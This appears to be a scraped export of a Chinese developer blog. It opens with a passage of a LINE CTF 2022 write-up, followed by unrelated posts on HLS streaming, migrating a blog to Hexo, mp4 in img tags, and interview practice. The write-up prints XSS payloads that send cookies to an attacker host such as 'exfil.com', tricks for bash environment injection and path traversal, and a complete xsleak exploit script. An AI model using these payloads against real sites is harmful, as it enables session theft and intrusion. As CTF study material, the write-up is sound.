http:&#x2F;&#x2F;0.0.0.0:11000&#x2F;view?id&#x3D;flag&amp;&#x2F;.. Host: 0.0.0.0# 就會產生神奇的結果： request.url: http:&#x2F;&#x2F;0.0.0.0#&#x2F;view?id&#x3D;flag&amp;&#x2F;.. request.url.query params: id&#x3D;flag&amp;%2F..&#x3D; unquote params: flag filename: flag keys: dict_keys([&#39;id&#39;, &#39;&#x2F;..&#39;]) path: .&#x2F;memo&#x2F;id&#x2F;..&#x2F;flag 雖然 request.url.query 整個變不見了，但是 request.query_params 卻還是有東西，因此就繞過了針對 request.url.query 的檢查。 根據他的說法，因為 request.url 是從 Host header 構造而來的，我們可以翻一下程式碼來驗證，如果沒找錯的話應該是在這：starlette&#x2F;datastructures.py#L38： if host_header is not None: url = f\"&#123;scheme&#125;://&#123;host_header&#125;&#123;path&#125;\" 因為 Host 被加了個 #，所以後面的 query string 就被當成 fragment 來解析了，而不是 query string，所以 request.url.query 就會是空的。 那為什麼 request.query_params 有東西呢？因為它是直接拿最原始的 query string，而不是 request.url.query，在這邊：starlette&#x2F;requests.py#L116 @property def query_params(self) -> QueryParams: if not hasattr(self, \"_query_params\"): self._query_params = QueryParams(self.scope[\"query_string\"]) return self._query_params 這真的是要看 source code 才會發現這種差異。 2022-03-29 補充： 感謝 @Zedd 提醒，把 ; 當作 &amp; 來看的行為跟 Python 版本有關，因為會引起 cache poisoning 的關係，在較新的版本中都已經修復了，而挑戰時使用的版本是 3.9.0，所以才有這問題，而我在本機重現時用的也是還沒修復的版本。 漏洞編號為 CVE-2021-23336，詳情可看這裡：urllib parse_qsl(): Web cache poisoning - semicolon as a query args separator。 bb(27 solves)程式碼很短： &lt;?php error_reporting(0); function bye($s, $ptn)&#123; if(preg_match($ptn, $s))&#123; return false; &#125; return true; &#125; foreach($_GET[\"env\"] as $k=>$v)&#123; if(bye($k, \"/=/i\") &amp;&amp; bye($v, \"/[a-zA-Z]/i\")) &#123; putenv(\"&#123;$k&#125;=&#123;$v&#125;\"); &#125; &#125; system(\"bash -c 'imdude'\"); foreach($_GET[\"env\"] as $k=>$v)&#123; if(bye($k, \"/=/i\")) &#123; putenv(\"&#123;$k&#125;\"); &#125; &#125; highlight_file(__FILE__); ?> 基本上就是要做到控制環境變數之後 RCE，這讓人自然而然會想到前陣子 P 牛發表的這篇：我是如何利用环境变量注入执行任意命令，裡面提到可以藉由控制 BASH_ENV 來執行命令。 不過比較麻煩的地方是 a-zA-Z 都不能用，所以要在不能用英文字母的狀況下寫出指令來讀 flag 並回傳到自己 server。 聊天室有人給了一個類似題目的連結可以參考：34C3 CTF &#x2F; Tasks &#x2F; minbashmaxfun &#x2F; Writeup，看了開頭給的 writeup 也才發現原來可以這樣用： # 等同於 $&#39;id&#39; $&#39;\\151\\144&#39; 靠這樣就可以繞開限制，不用到字母，bash 真是博大精深。 在 Discord 看到有人貼這串，值得參考跟筆記一下：好讀版，推特原串：https://twitter.com/DissectMalware/status/1023682809368653826 online library(19 solves)這是個可以讀取特定檔案範圍的網頁，重點在這一段： app.get(\"/:t/:s/:e\", (req: Express.Request, res: Express.Response): void => &#123; const s: number = Number(req.params.s) const e: number = Number(req.params.e) const t: string = req.params.t if ((/[\\x00-\\x1f]|\\x7f|\\&lt;|\\>/).test(t)) &#123; res.end(\"Invalid character in book title.\") &#125; else &#123; Fs.stat(`public/$&#123;t&#125;`, (err: NodeJS.ErrnoException, stats: Fs.Stats): void => &#123; if (err) &#123; res.end(\"No such a book in bookself.\") &#125; else &#123; if (s !== NaN &amp;&amp; e !== NaN &amp;&amp; s &lt; e) &#123; if ((e - s) > (1024 * 256)) &#123; res.end(\"Too large to read.\") &#125; else &#123; Fs.open(`public/$&#123;t&#125;`, \"r\", (err: NodeJS.ErrnoException, fd: any): void => &#123; if (err || typeof fd !== \"number\") &#123; res.end(\"Invalid argument.\") &#125; else &#123; let buf: Buffer = Buffer.alloc(e - s); Fs.read(fd, buf, 0, (e - s), s, (err: NodeJS.ErrnoException, bytesRead: number, buf: Buffer): void => &#123; res.end(`&lt;h1>$&#123;t&#125;&lt;/h1>&lt;hr/>` + buf.toString(\"utf-8\")) &#125;) &#125; &#125;) &#125; &#125; else &#123; res.end(\"There isn't size of book.\") &#125; &#125; &#125;) &#125; &#125;); 第 path 的地方放上 /%2e%2e%2f/0/12345 就可以 path traversal 然後任意讀檔一下，但問題是要讀哪裡。 在隊友的幫忙下讀了 /proc/self/mem，就是現在 node process 的記憶體，至於讀哪段要從 /proc/self/maps 去找，怎麼找我就不知道了。 然後因為有個 endpoint 會把參數放到 memory 中，所以可以先用那個 endpoint 去放你的 payload，接著因為這題讀檔有給 offset 的關係，找到記憶體中的 payload 把 offset 設定好，丟給 bot 以後就 XSS 了。 不過根據賽後討論，似乎是因為 flag 在 cookie 中，而 bot 送 request 到 server 時會帶 flag，所以這段 flag 也會出現在記憶體中，因此直接讀記憶體也可以找到 flag，不用 XSS。 Haribote Secure Note(7 solves)這題卡了一整天，到最後依舊沒解開，so sad QQ 這題可以設定一個暱稱，最多 16 個字，然後可以新增 note，有 title 跟 content，顯示筆記的頁面關鍵程式碼在這裡： &lt;script nonce=\"&#123;&#123; csp_nonce &#125;&#125;\"> const printInfo = () => &#123; const sharedUserId = \"&#123;&#123; shared_user_id &#125;&#125;\"; const sharedUserName = \"&#123;&#123; shared_user_name &#125;&#125;\"; // 省略 &#125; const printInfoBtn = document.getElementById('printInfoBtn'); printInfoBtn.addEventListener('click', printInfo); &lt;/script> 還有接近結尾的這段： &lt;script nonce=\"&#123;&#123; csp_nonce &#125;&#125;\"> const render = notes => &#123; // 省略 &#125;; render(&#123;&#123; notes &#125;&#125;) &lt;/script> 前面那邊給了我們 16 個字的 JS injection，最後面 notes 那裡則是可以用 &lt;/script&gt; 來跳離標籤，是 HTML injection，而這題的難點在於 CSP 很嚴： &lt;meta content=\"default-src 'self'; style-src 'unsafe-inline'; object-src 'none'; base-uri 'none'; script-src 'nonce-&#123;&#123; csp_nonce &#125;&#125;' 'unsafe-inline'; require-trusted-types-for 'script'; trusted-types default\" http-equiv=\"Content-Security-Policy\"> 因為有 nonce，所以 unsafe-inline 沒作用，而 unsafe-eval 沒開所以也沒辦法動態去執行程式碼。 當初卡很久之後我有一個想法是我們可以用 HTML injection 插入一個表單 &lt;form id=&quot;f&quot;&gt;，然後就可以對 admin CSRF，目的是去改 admin 的暱稱，因為在另一個頁面 profile 是沒有 CSP 的，而且同樣可以注入： &lt;input name=\"display_name\" type=\"text\" class=\"form-control form-control-sm\" id=\"inputUserDisplayName\" value=\"&#123;&#123; current_user.display_name &#125;&#125;\"> nickname 的部分可以設定成：&quot;;f.submit();&quot; 之類的，就可以送出表單。改完之後再去造訪 profile 頁面，在那個頁面執行 XSS。 但最大的問題是 &quot;onfocus=eval(name) 有 20 個字元，超過了界線所以無法成功（而且還要想一下 name 要怎麼設定）。 賽後看了其他人的解答，主要有三種。 第一種來自 Super HexaGoN，是利用一個神奇的 script data double escaped state，把兩個注入點中間的東西都註解掉，就可以在有 nonce 的 script 裡面執行程式碼。之前從沒看過這個，以後再來研究一下。 display name: &lt;!--&lt;script&gt;&quot;&#125;&#x2F;* title: --&gt; &#x2F;* content: *&#x2F; location.href&#x3D;&#39;(attacker)&#x2F;c&#x3D;&#39;+document.cookie 第二種是利用 import 不會被 Trusted Types 檔的特性，底下 payload 來自 maple3142： display name: \"+import(y)+\" title: &lt;/script>&lt;a id=x href=\"//SERVER\">&lt;/a> content: &lt;a id=y href=\"data:text/javascript,open(x+`?`+document.cookie);alert()\">&lt;/a> 第三種則是利用 iframe，在其他頁面執行程式碼（來自 eskildsen#8025）： name: &quot;;f.eval(p+&quot;&quot;);&quot; title: &lt;&#x2F;script&gt;&lt;iframe src&#x3D;&quot;&#x2F;p&quot; name&#x3D;f&gt;&lt;&#x2F;iframe&gt; content: &lt;a href&#x3D;&quot;javascript:window.top.location&#x3D;&#39;http:&#x2F;&#x2F;exfil.com&#x2F;&#39;+btoa(this.parent.document.cookie)&quot; id&#x3D;p name&#x3D;p&gt;payload&lt;&#x2F;a&gt; 第三種是我唯一覺得自己有可能想到的，因為其他兩個我都不知道。 話說 &quot;;f.eval(p+&quot;&quot;);&quot; 跟 &lt;!--&lt;script&gt;&quot;&#125;/* 恰巧都是 16 個字，我猜其中一個應該是非預期解，這就是 CTF 好玩的地方XD 然後這題真的很有趣而且很值得學習，三種解法都是完全不同的思路。 喔對了，然後 maple3142 的 writeup 解決了我一個疑惑，那就是為什麼這一題的 template 都不會 escape，原來是因為 flask 預設只會 escape HTML&#x2F;XML&#x2F;XHTML，難怪我沒看到什麼設定。 title todo(6 solves)這題基本上就是個上傳圖片的網站，上傳完會拿到一個 url，接著可以給 title 跟 image url 新建一個 post。 flag 則是用 admin 身份造訪時會放在網頁的最 footer，而且有著奇怪的格式：LINECTF&#123;([0-9a-f]/)&#123;10&#125;&#125; 然後在顯示圖片的網頁有個地方沒有用雙引號包住： &lt;img src=&#123;&#123; image.url &#125;&#125; class=\"mb-3\"> 雖然看起來是很小的一點，但其實整題的解法都是從這邊延伸出去的。從這邊不難看出我們可以控制 img 的任何屬性，不過我在這邊卡了頗久，想說可以控制又怎樣，沒辦法跳離 img 就不能 XSS。 然後經過隊友提醒才想到 STTF 的 xsleak，透過 img 的 lazy loading 來偵測是否有 scroll 的行為，所以只要 title 用很長，把 img 推下去，再加上 loading=lazy 的屬性，就可以搭配 STTF 來 leak 一個 byte。 不過這題還有一點要注意，就是 CSP： default-src &#39;self&#39;; script-src &#39;self&#39;; style-src &#39;self&#39;; img-src &#39;self&#39; blob: CSP 繞不開，所以就算 src 可控，也沒辦法設置外面的圖片。因此這題加上了另一個機制：cache，可以根據 response header 來決定一個圖片的 cache 是 miss 還是 hit，所以我們只要上傳一張新的圖片丟給 bot，過幾秒再去看他的 response header，如果是 hit 就代表 bot 有訪問圖片，代表 SSTF 有成功。 照著這個概念寫一個 exploit 就好： import requests import json import time from time import sleep base_url = 'http://35.187.204.223' cookie = \"session=.eJwtzrERwzAIAMBdVKcAJCHkZXyA4JzWjqtcdk-K_AT_LnuecR1le513PMr-XGUrqLggVU2SQCFTKqiIUxpbIhpNThy0GkEdXWaGdJ-16nJ3GAO8iwP0QeY5ISjnzLoImHE5VwmdzVCIaxOMMNGIPrizhlErv8h9xfnfAJTPF00fL_M.Yj71GQ.S1yffSzbOk6Rny1VyCqPTL-5wM8\" def upload_image(): files = &#123;'img_file': open('a.png','rb')&#125; resp = requests.post(base_url + '/image/upload', files=files, headers=&#123; \"Cookie\": cookie &#125;) return json.loads(resp.text) def create_post(url): resp = requests.post(base_url + '/image', data=&#123; \"title\": str(time.time()) + \"w\"*5000, \"img_url\": f\"/static/image/111 srcset=&#123;url&#125; loading=lazy \" &#125;, headers=&#123; \"Cookie\": cookie &#125;, allow_redirects=False) return resp.headers[\"X-ImageId\"] def share(url, keyword): resp = requests.post(base_url + '/share', json=&#123; \"path\": \"image/\" + url + \"#:~:text=\" + keyword, &#125;, headers=&#123; \"Cookie\": cookie &#125;) return resp.text def check_cached(img_url): resp = requests.get(base_url + img_url, headers=&#123; \"Cookie\": cookie &#125;, allow_redirects=False) return resp.headers[\"X-Cache-Status\"] def run(): known = \"LINECTF&#123;\" while True: for char in \"0123456789abcdef\": print(\"trying:\" + known+char) resp = upload_image() img_url = resp[\"img_url\"] print(\"img url:\" + img_url) img_id = create_post(img_url) print(\"img id:\" + img_id) share_res = share(img_id, known + char) print(\"resp:\" + share_res) sleep(3) cache_resp = check_cached(img_url) print(\"cached:\" + cache_resp) if cache_resp == \"HIT\": known += char + \"/\" print(known) break run() 另外，maple3142 的 writeup 又解決了我一個疑惑，那就是為什麼 flag 要有那些 /？原來是因為 Chromium 為了避免這種 xsleak，所以在判斷 SSTF 的時候一定要匹配到整個單字才會 scroll。 舉例來說，如果頁面上有這串字：Hello world，你 text fragment 指定 He，是不會理你的，要 Hello 才會，這也是為什麼這題要用 / 來分割，因為沒分割的話就沒辦法一個字一個字來 leak。 me7-ball(2 solves)這題看起來好像跟 crypto 比較有關就沒仔細看了，直接貼 Super HexaGoN 的 writeup：https://gist.github.com/mdsnins/2912b9656c837e5190364136b307c682","link":"/2022/03/27/linectf-2022-writeup/"},{"title":"直播協議 hls 筆記","text":"前言最近剛好在做直播相關的東西，雖然說是做前端，但還是必須懂一些直播的原理至少要知道有哪些格式，以及各種格式的優缺點是什麼，做起來也會比較踏實 這篇就簡單記錄一些心得跟資料，如果想比較深入了解 hls 的，可以參考下面這兩篇文章： 直播协议的选择：RTMP vs. HLS 在线视频之HLS协议—学习笔记：M3U8格式讲解及实际应用分析 hls 是什麼？我覺得以直播來說，hls 是一個相當好懂的協定，其實就是透過一個 .m3u8 的播放列表，然後裡面有多個 .ts 的檔案你只要照著播放列表裡面給你的檔案順序播放就好了，聽起來很容易吧！ 為了讓大家更明白，直接附上擷取自某處的播放列表： #EXTM3U #EXT-X-VERSION:3 #EXT-X-ALLOW-CACHE:YES #EXT-X-MEDIA-SEQUENCE:4454 #EXT-X-TARGETDURATION:4 #EXTINF:3.998, no desc 25133_src&#x2F;4460.ts #EXTINF:3.992, no desc 25133_src&#x2F;4461.ts #EXTINF:3.985, no desc 25133_src&#x2F;4462.ts #EXTINF:3.979, no desc 25133_src&#x2F;4463.ts #EXTINF:3.996, no desc 25133_src&#x2F;4464.ts 就算你沒看過這個格式，你大概看一下也可以猜出來它在做什麼每一個 ts 就是一個片段，然後 #EXTINF:3.996 代表這個片段的時間長度#EXT-X-TARGETDURATION:4，這邊的數字必須比播放清單中的任何一個影片的時間都大代表播放器應該每隔幾秒去抓一次新的播放清單 例如說，下一次抓到的可能會長這樣： #EXTM3U #EXT-X-VERSION:3 #EXT-X-ALLOW-CACHE:YES #EXT-X-MEDIA-SEQUENCE:4455 #EXT-X-TARGETDURATION:4 #EXTINF:3.992, no desc 25133_src&#x2F;4461.ts #EXTINF:3.985, no desc 25133_src&#x2F;4462.ts #EXTINF:3.979, no desc 25133_src&#x2F;4463.ts #EXTINF:3.996, no desc 25133_src&#x2F;4464.ts #EXTINF:3.998, no desc 25133_src&#x2F;4465.ts 就是最後面多了一個片段。所以只要一直維持這個規則，就能夠不斷取到新的片段那如果很不巧的，server 沒有及時產生出播放列表怎麼辦呢？ 例如說在第 4 秒的時候去拿，發現沒更新，server 在第 4.5 秒才把新的播放片段產生出來如果發生這種「拿了播放清單，但長的一樣」的情形，就會把抓取的時間減一半，直到抓到為止像以上情形，第 4 秒沒拿到新的，就會隔 2 秒之後再去抓 這個規則可以參考：HTTP Live Streaming draft-pantos-http-live-streaming-20 When a client loads a Playlist file for the first time or reloads a Playlist file and finds that it has changed since the last time it was loaded, the client MUST wait for at least the target duration before attempting to reload the Playlist file again, measured from the last time the client began loading the Playlist file. If the client reloads a Playlist file and finds that it has not changed then it MUST wait for a period of one-half the target duration before retrying. 至於做直播最關心的延遲問題，也可以直接從這個播放列表直接推測出來以上面的例子來說，一共有 5 個片段，每一個片段 4 秒，延遲就是 20 秒Apple 官方建議的是 3 個片段，每個片段 10 秒 What duration should media files be?A duration of 10 seconds of media per file seems to strike a reasonable balance for most broadcast content. How many files should be listed in the index file during a continuous, ongoing session?The normal recommendation is 3, but the optimum number may be larger. 可參考：Apple: HTTP Live Streaming Overview 不過依照官方的建議，就會有 30 秒的延遲，當然延遲越久直播的狀況會越好，可是體驗也會比較差一點因此，我們可以來看看幾個直播網站都是怎麼設定的 先來看看直播大頭：Twitch #EXTM3U #EXT-X-VERSION:3 #EXT-X-TARGETDURATION:5 #ID3-EQUIV-TDTG:2016-11-26T02:40:23 #EXT-X-MEDIA-SEQUENCE:376 #EXT-X-TWITCH-ELAPSED-SYSTEM-SECS:1511.137 #EXT-X-TWITCH-ELAPSED-SECS:1508.980 #EXT-X-TWITCH-TOTAL-SECS:1535.137 #EXTINF:4.000, index-0000000377-6zCW.ts #EXTINF:4.000, index-0000000378-vHZS.ts #EXTINF:4.000, index-0000000379-Gkgv.ts #EXTINF:4.000, index-0000000380-PNoG.ts #EXTINF:4.000, index-0000000381-h58g.ts #EXTINF:4.000, index-0000000382-W88t.ts 6 個片段 * 4 秒 &#x3D; 24 秒可是如果你仔細觀察（開 chrome devtool 就可以了），實際上 twtich 的播放器在拿到列表以後會直接嘗試從「倒數第三個」片段開始載入，所以延遲就縮短為 3*4 &#x3D; 12 秒了 再來看看台灣的 livehouse.in #EXTM3U #EXT-X-VERSION:3 #EXT-X-ALLOW-CACHE:NO #EXT-X-MEDIA-SEQUENCE:2291 #EXT-X-TARGETDURATION:6 #EXTINF:5.2090001106262207, 1480116261segment_v02291.ts #EXTINF:5.2080001831054688, 1480116261segment_v02292.ts #EXTINF:5.2080001831054688, 1480116261segment_v02293.ts 5*3 &#x3D; 15 秒 所以一般用 hls 的直播網站，延遲大概都會在 10~20 秒這個區間以內我猜比這個短的話對 server 壓力可能很大，而且網速慢的話，看起來會很卡比這個長的話雖然很順，但是使用者體驗不太好，延遲太高所以能找到最好的延遲就是在這個區間內了 最後，我們來看看如果要在網頁上播放的話，有哪些選擇因為現在已經是個 flash 快死掉的年代了，所以如果可以的話，首選當然是 html5瀏覽器支援度不夠高的話再 fallback 回去 flash 先來介紹一下現成的商業授權播放器，例如說 jwplayer 或是 flowplayer，都是很不錯的選項。尤其是當 open source 的方案出現問題你又修不好的時候，就會很希望公司花錢買一個商業播放器，一切問題都搞定。 open source 的方案大概就是 videojs 一支獨秀了，有沒有其他的後起之秀我是不知道啦，有的話麻煩推薦一下。 然後因為 hls 這個格式瀏覽器本身是沒辦法播放的，所以要搭配一些 pluginvideojs 官方有一個 videojs-contrib-hls，加上去之後就可以播放了，但我自己用過以後感覺不是很好。 最後選擇了知名的影音網站 dailymotion 提供的開源解決方案 hls.js。 這一篇是他們官方的部落格，有介紹說為什麼要自己寫一套，以及解決了哪些問題，滿值得一看的，可以順便了解一下。","link":"/2016/11/26/livestreamming-hls-note/"},{"title":"部落格搬家心得：從 Logdown 到 Hexo","text":"前言終於搬完啦！ 花了一整天的時間在搞搬家的東西，其實真的挺麻煩的，而且中途碰到滿多小問題，所以特地寫這篇來紀錄一下心得。 為什麼搬家？你知我知獨眼龍也知，Logdown 基本上已經是一個停滯的產品了，從很久以前就不再更新了，看樣子應該也不會再更新了。 我真的滿喜歡 Logdown 的，因為我覺得使用起來很方便很順手，完全打到我，到既然是個停止維護的產品，繼續在那邊就會有一些風險，例如說哪天 blog 突然掛掉連不上或者是文章全部不見之類的。 所以囉，就趁著最近有空趕快把部落格整個搬出來，避免之後發生什麼災難就來不及了。 不過其實我也是滿不想搬的…畢竟搬家真的超麻煩，而且這次又換一個全新的 Domain，往長遠來看是好的啦，但也代表要放棄之前累積的那些流量就是了。 第一個挑戰：匯出文章Logdown 後台有一個功能可以匯出所有 blog 的文章然後寄到你信箱，但我按了幾次他只有出現：「在 5 分鐘之後會把文章寄到你信箱」的通知，之後就什麼都沒收到了。 所以我推測要嘛就是壞了，要嘛就是我文章太多檔案大小超過所以 GG。但不論是哪一種，都注定我用不到這個功能了。 身為一個工程師，我馬上想到是不是該寫個爬蟲之類的，研究了一下 Logdown 的結構之後放棄了，因為他所有 API 傳回的資料都是 HTML…我不想自己 parse 啊… 正當絕望之際，突然發現後台有個「下載 Markdown 格式」的功能，可以下載單篇文章，試過這個功能正常之後，立刻想到一個解法： 只要有所有下載文章連結，就可以寫 script 全部載下來了 第一步：取得網址到 logdown 後台（http://logdown.com/account/posts ），然後一直往下捲動直到沒有文章為止。 打開 Chrome devtool 執行下面程式碼，然後把結果按右鍵保存起來 var a = Array.prototype.map.call(document.querySelectorAll('a'), item => item.getAttribute('href')).filter(item => item.indexOf('/raw') >= 0);for(var k of a) &#123;console.log('\"'+k+'\"')&#125; 沒意外的話，console 應該會出現像下面這種結果： .... VM192:1 \"/account/posts/294284-javascript-redux-middleware-details-tutorial/raw\" VM192:1 \"/account/posts/294037-javascript-redux-basic-tutorial/raw\" VM192:1 \"/account/posts/293940-javascript-redux-model-real-world-browserhistory-not-found/raw\" 自己把前面那個惱人的字串取代掉之後，你就得到所有文章的網址了。 第二步：下載可是取得網址之後，這麼多網址要怎麼下載呢？ 很簡單，我們自己寫個 bash script 就搞定了！核心程式碼就是用 wget 把文章抓下來，這邊的 session key 自己去 chrome 裡面看 cookie 的值就好： wget --heade=\"Cookie:_logdown_session=xxxx;\" http://logdown.com/account/posts/2223627-review-the-classical-sort-algorithm-with-javascript/raw -O review-the-classical-sort-algorithm-with-javascript.md 完整 script： declare -a arr=( \"/account/posts/2223627-review-the-classical-sort-algorithm-with-javascript/raw\" \"/account/posts/2223612-dom-event-capture-and-propagation/raw\" \"/account/posts/2223601-http-cache/raw\" \"/account/posts/2223581-ajax-and-cors/raw\" ) for i in \"$&#123;arr[@]&#125;\" do url=\"http://logdown.com\"$&#123;i&#125; name=`echo $url | sed \"s/.*posts\\/[0-9]*[-]//g\" | sed \"s/\\/raw//g\"` wget --heade=\"Cookie:_logdown_session=xxx;\" $url -O $name\".md\" done 把 arr 下面那些換成剛剛從 chrome 得來的網址並且把 session 換成自己的就搞定了，就把所有文章都下載了！ 當個工程師真好 第二個挑戰：修文章格式從 logdown 下載下來的還需要加一些 meta tag 才能在 hexo 上面正常跑，而且我也想順便修一下 tag，這部分我完全是手動修…修了兩百篇左右，因為要加 tag 這也不能自動加。（硬要寫也是可以啦，但我懶得弄） 還有一個地方是我有文章用到 hexo 禁止的語法，就是兩個大括號那個，hexo 就直接報錯，然後也沒跟我講哪一篇，我只好自己用二分搜尋法，不斷拿掉文章看問題到底出在哪邊。 第三個挑戰：table of content 壞掉現在大概右邊看到那個就是 TOC，Table Of Content，是個我滿喜歡的功能，但不知道為什麼這功能壞掉了，在我自己去 trace hexo 的 code 之後，發現是一個滿奇怪的問題，就是 cheerio 抓不到 span 的 id，所以連結全部變成 undefined。 身為工程師，這種小問題當然是可以自己修，於是我就修了兩個小地方： // 原本的 var $ = cheerio.load(str); // 改過的，加上 decodeEntities 處理中文 // https://cnodejs.org/topic/54bdd639514ea9146862ac37 var $ = cheerio.load(str, &#123;decodeEntities: false&#125;); // 原本的，會抓不到 id var id = $(this).attr('id'); // 自己加上下面這一段用 Regexp 抓出來 if (!id) &#123; var temp = $(this).html().match(/id=\"(.*)\">/); if (temp &amp;&amp; temp[1]) &#123; id = temp[1]; &#125; &#125; 當一個工程師真好 結論這次用的模板是：hexo-theme-beantech，是我覺得很不錯的一個版型，不過我也有自己修一些小地方就是了。 經歷過這次搬家之後，覺得 Hexo（部落格系統）+ Github Page（Hosting）+ Cloudflare（https）根本是工程師寫部落的最佳實踐，全部免費的方案然後所有必要的東西一次擁有，真棒真棒。 話說之後還可以改成配合 CI 做自動 deploy，那個就等之後再研究吧！","link":"/2017/09/03/moving-from-logdown-to-hexo/"},{"title":"原來 img src 也支援 mp4（Safari 限定）","text":"有些網站會用 GIF 來做一些圖檔，畢竟會動嘛，看起來就比一些靜態的圖片還要厲害，還要來得更吸引人。或其實不只是因為吸引人，而是有些需求本來就需要一個會動的圖，例如說貼圖，會動是很正常的。 但是 GIF 的缺點之一眾所皆知，就是檔案很大，真的很大。尤其是手機上因為解析度比較高，可能會需要用到三倍大小的圖片，就算只顯示 52 px，也要準備 156px 的圖檔，佔的空間就更多了。以網頁來說，當然是要載入的資源越少越好，越小也越好。 因此，很多網站會改用 &lt;video&gt; 標籤來呈現這些動圖，只要先轉成 mp4 格式，檔案大小就能小很多。不過轉成 &lt;video&gt; 的問題大概就是原先用 &lt;img&gt; 的一些好處會不見，像是 lazy loading 似乎就沒有原生支援，有一些麻煩。 而我在查資料的過程中，居然意外發現在 Safari 上面，&lt;img&gt; 是支援 mp4 的！也就是說，你可以這樣做： &lt;img src=\"test.mp4\"> 而且這個功能推出很久了，從 2017 的時候就有了：Bug 176825 - [Cocoa] Add an ImageDecoder subclass backed by AVFoundation 我是從這篇文章知道的：Evolution of &lt;img&gt;: Gif without the GIF 如果 &lt;img&gt; 裡面也可以放 mp4 的話，就可以同時利用到兩者的優點，又不用換標籤，又支援 lazy loading，然後檔案大小又一下縮減了許多。 但可惜的事情是，只有 Safari 有支援而已，就算過了六年，在 Chromium 以及 Firefox 上都沒看到這個功能，而且未來也沒什麼機會看到了。 之所以會這樣講，是因為 Chromium 已經明確表示不會支援，討論串在這邊：Issue 791658: Support &lt;img src&#x3D;”*.mp4”&gt; ，在 2018 的時候就已經被標記為 Wont fix，理由如下： Closing as WontFix per c#35, due to the following: - The widespread adoption of WebP (addresses CDN use case) - Forthcoming AV1 based image formats (ditto). - Memory inefficiency with allowing arbitrary video in image. - Most sites have already switched to &lt;video muted&gt; now that autoplay is allowed. 第一點提到的是 WebP 其實也有個 Animated WebP 的格式，可以放在 &lt;img src&gt; 裡面而且也會動，檔案大小更小，其他優缺點可以參考 Google 自己寫的：使用 WebP 動畫有什麼好處？ 而第二點是在說比較新的圖片格式 AVIF 也有 Animated AVIF，同樣也支援動圖。 如果這些新的圖片格式都可以取代 GIF 的話，好像確實沒什麼必要一定要使用 mp4？ 而 Firefox 的話雖然沒有說不會做，但是 issue 也已經很久沒動了：Add support for video formats in &lt;img&gt;, behaving like animated gif 也有人希望可以把這個功能加入規格，但也有一陣子沒有動靜：Require img to be able to load the same video formats as video supports #7141 總而言之，看起來這個功能應該只會在 Safari 上面有了。 可惜我在用的 image service 的自動轉檔功能只支援 GIF 轉 mp4，不支援轉成 animated WebP 或是 animated AVIF，不然就超方便的。 總結如果想要繼續用 &lt;img&gt; 來放動圖的話，最完整的方式應該是使用 &lt;picture&gt; 標籤搭配多種檔案格式，像這樣： &lt;picture> &lt;source type=\"image/avif\" srcset=\"test.avif\"> &lt;source type=\"video/mp4\" srcset=\"test.mp4\"> &lt;source type=\"image/webp\" srcset=\"test.webp\"> &lt;img src=\"test.gif\"> &lt;/picture> 這樣就可以確保在每個瀏覽器上面都可以呈現出結果，並且會選擇通常檔案大小較小的圖片。 我隨便試了一下，自己錄了一個簡單的 gif，原始大小是 75 KB： 轉成 WebP 之後是 58 KB (-22.6%)： 轉成 mp4 是 17 KB（-77.3%）： 轉成 AVIF 是 11 KB（-85.3%）： 看來最新的檔案格式還是滿厲害的，一下就小了超多。","link":"/2023/09/11/mp4-in-img-src/"},{"title":"我心目中的理想面試流程","text":"儘管去年面試了大約二十家公司，但我也是一直到最近才明白，面試流程對一間公司來說有多麼重要當然，HR 的重要程度也非同小可 若是這間公司的 HR 做的很好，面試流程也讓面試者覺得很用心在這個網路開放的時代，很可能這個求職者之後就會跟朋友分享：欸欸，我今天去 XXX，他們面試流程超棒的欸！反之亦然，一個差勁的面試流程，也可能會禍害千年，負評一個接著一個底下有些實際例子，都是一些正面的例子，我會直接把公司名稱講出來沒錯，去面試的公司對我好，我都是有記在心裡的！ 今天想跟大家談談我心目中理想的面試流程大致上可分為三步驟 面試前（安排面試） 面試中 面試後 以下就根據這三個步驟一一來討論 面試前就我所知，在安排面試的時候主要可分為兩種方式， 電話 信件 用電話安排面試的好處是當下就可以敲定時間，不用透過信件一來一往但我認為也有一些壞處，像是求職者幾乎都會面試好幾間公司有可能你打電話去的時候，他正在面試，或是正在忙無法接電話 或是像我那時候安排了一堆面試他打給我的時候，我必須查看手機的行事曆才知道我哪天有空，可以面試因此我個人是偏好：先用信件敲時間，兩三天沒有回音的話，才用電話約面試 有一點要補充的是，用電話敲完面試時間之後，HR一定一定一定要再寄一封面試邀請信就像前面提到的，求職者可能很忙，當下如果沒有即時記錄這時間，之後也不知道從何找起所以寄信再通知一下面試時間，我覺得是必備而且很貼心的行為 至於用信件安排面試時間，我碰過的有兩種： 直接排定時間給你，不行的話再回信橋時間 先預定好許多日期與時段，自行選擇其中有空的時段 1 跟 2 對公司與求職者來說都有一些顯而易見的優缺點像是1.如果求職者那天有空，那就很好，時間就這樣橋定了但如果求職者沒空，就還要繼續書信往返 那2.的話就是公司必須先選好幾個時段是可以面試的，這對有些變動較大的公司似乎比較困難但對求職者來說，2.的話你可以自己選有空的時段，十分方便muzik online 就是這樣做的，提供許多時間讓求職者自行選擇 敲好面試時間之後，第二個環節就是：寄送面試通知信信件上面應該附什麼樣的資訊呢？ 時間 地點 應徵職位 公司電話 其他 這之中在 2.地點 上面，視公司位置可以再多加著墨為什麼？因為有些公司可能是辦公大樓需要換證、可能位置很難找這時候如果在信件上面多說一些，會讓求職者覺得很貼心 例如說： 地點：台北市南京北路 689 號 10 樓（在 7-11 樓上，近捷運南京東路站）可以直接進入大樓，無需換證，到 10 樓出電梯門之後右轉，按鈴說是來面試的即可 這樣就比只有單純講地點的通知信好多了，是吧！muzik online 的面試信就是這樣 接著在 5.其他 的部份，可以多說明一些與面試有關的相關資訊，例如說 面試流程大約一小時，前面有十分鐘會先讓您填寫個人基本資料您之前所寄的履歷我們會印出來，所以您無需攜帶但若是有任何您覺得可以加分、或是證明自己能力的文件或成果，歡迎攜帶相關資料 話說我覺得幫求職者印履歷這個小動作滿貼心的代表有重視這一份履歷 與求職者有關的部份差不多就到這裡，接著講講公司所要注意的事項 面試官在面試前，最好可以先稍微讀過求職者的履歷我覺得這滿重要，人家求職者要準備，面試官就不用準備嗎？我覺得也要，至少先看過一下他的履歷，到時候問的問題才會比較有深度、可以直接切入重點而且求職者會知道說：喔～原來他有看過我的履歷了 像是我之前履歷上面都會附個人部落格（其實就是這裡XD）有面試官如果在我去面試之前有先來逛過一下，我會覺得超級感人，一種「你也太用心了吧」的感覺 面試中終於來到了面試的這一天，首先有幾種狀況我覺得「絕對不能發生」 讓面試者乾等 面試官找不到人 